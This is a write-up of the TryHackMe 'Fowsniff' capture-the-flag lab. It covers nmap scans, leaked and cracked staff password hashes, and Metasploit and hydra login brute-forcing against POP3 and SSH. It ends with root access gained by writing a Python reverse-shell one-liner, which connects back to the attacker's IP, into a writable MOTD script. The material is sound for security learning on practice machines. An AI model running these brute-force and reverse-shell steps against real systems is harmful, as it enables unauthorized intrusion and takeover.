---
date: 2025-01-22
difficulty: easy
draft: "false"
os: linux
skills: nmap, netcat, reverse shell, telnet, ssh
tags: [tryhackme, writeup]
title: Fowsniff CTF Write-Up
---

# Fowsniff CTF Write-Up

![Fowsniff CTF Overview](./overview.png)

Fowsniff CTF is a machine with a lot of hints perfect for beginners.

<!-- truncate -->

## Recon

### nmap

nmap finds four open TCP ports, SSH (22), HTTP (80), POP3 (110), IMAP (143):

```bash
nmap -p- --open --min-rate=5000 -Pn -T4 -oN nmap/open_ports 10.10.30.229
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 10:33 CET
Nmap scan report for 10.10.30.229 (10.10.30.229)
Host is up (0.048s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap

Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
```

```bash
nmap -p 22,80,110,143 -sV -sC -oN nmap/services_version 10.10.30.229
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 10:36 CET
Nmap scan report for 10.10.30.229 (10.10.30.229)
Host is up (0.047s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE TOP USER RESP-CODES SASL(PLAIN) PIPELINING UIDL CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: IDLE IMAP4rev1 listed have LOGIN-REFERRALS OK post-login more capabilities LITERAL+ Pre-login SASL-IR AUTH=PLAINA0001 ID ENABLE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

## Hashed Credentials

Looking a bit at the hints they give me, on google I find [here](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt) the encrypted credentials of the staff working there:

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

You can use [hashes.com](https://hashes.com/en/decrypt/hash) to decrypt them, there is only one invalid hash from the user stone.

```
mauer@fowsniff:mailcall
mustikka@fowsniff:skyler22
tegel@fowsniff:apples01
baksteen@fowsniff:bilbo101
seina@fowsniff:scoobydoo2
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```

### users.txt

```bash
cat credentials_hashed.txt | awk -F '@' '{print $1}' > users.txt
```

### passwords.txt

```bash
cat credentials_hashed.txt | awk -F ':' '{print $2}' > passwords.txt
```

## Enumeration

### Website by IP - TCP 80

It is a simple webpage, nothing seems to be interesting and looking the source code I couldn't find anything interesting.

### POP3 - TCP 110

#### Metasploit

Following the steps of this [report](https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/pop3/pop3_login):

```
$ msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS 10.10.30.229
set USER_FILE loot/users.txt
set PASS_FILE loot/passwords.txt
set STOP_ON_SUCCESS true
exploit
```

After a while I find the user name and password:

```
[-] 10.10.30.229:110      - 10.10.30.229:110 - Failed: 'mauer:mailcall', ''
[-] 10.10.30.229:110      - 10.10.30.229:110 - Failed: 'mustikka:skyler22', ''
...SNIP...
[+] 10.10.30.229:110      - 10.10.30.229:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '
```

#### Telnet

Using the `telnet` command and following this [guide](https://www.shellhacks.com/retrieve-email-pop3-server-command-line/) to know what commands are available I login:

```
telnet 10.10.30.229 110
Trying 10.10.30.229...
Connected to 10.10.30.229.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
```

List all messages in the server:

```
LIST
+OK 2 messages:
1 1622
2 1280
```

The first message is addressed to 8 people and shows the temporary password to log in inside the SSH service.

```
RETR 1
+OK 1622 octets
...SNIP...
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
...SNIP...
The temporary password for SSH is "S1ck3nBluff+secureshell"
...SNIP...
```

The second message is addressed to Seina but doesn't have anything important to gather info about the target.

### SSH - TCP 22

Connect to ssh service using brute-force with the `hydra` command:

```
$ hydra -L loot/users.txt -p "S1ck3nBluff+secureshell" 10.10.30.229 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 12:34:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://10.10.30.229:22/
[22][ssh] host: 10.10.30.229   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 12:34:27
```

I log into the ssh with the user `baksteen` and the password `S1ck3nBluff+secureshell`.

### Getting Root Access

Looking in the system I see that `baksteen` is the `users` group and I try to find some files that has that group to see if there is something interesting.

```
$ baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null
/opt/cube/cube.sh
...SNIP...
```

Contents of the `/opt/cube/cube.sh` file, this is the banner when you log in into the system:

```
baksteen@fowsniff:~$ cat /opt/cube/cube.sh
printf "
                            _____                       _  __  __
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|
-:      y.      dssssssso                ____
-:      y.      dssssssso               / ___|___  _ __ _ __
-:      y.      dssssssso              | |   / _ \| '__| '_ \
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _
-:      o.      yssssssso               \____\___/|_|  | .__/  (_)
-:    .+mdddddddmyyyyyhy:                              |_|
-: -odMMMMMMMMMMmhhdy/.
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

Looking in the file system, there is a file inside the `/etc/update-motd.d` folder named `00-header*` that runs this script.

You can edit the script `cube.sh` to get a reverse shell with python:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.14.123",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["
/bin/sh","-i"]);'
```

Now start a netcat with and log in with ssh to get the reverse shell:

```
$ nc -nlvp 1234
Connection from 10.10.30.229:51180
```

Now I'm root user, so I can get the `flag.txt` file, in this case there is no hash, only a message saying that you completed the machine.

```
# whoami
root
# cd root
# ls
Maildir
flag.txt
# cat flag.txt
   ___                        _        _      _   _             _
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/

...SNIP...

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```

And the machine is pawned ;)

## References

- ben. (2020, April 09). <span class="reference-title">Fowsniff CTF</span>. _THM Challenges_. [https://tryhackme.com/r/room/ctf](https://tryhackme.com/r/room/ctf)
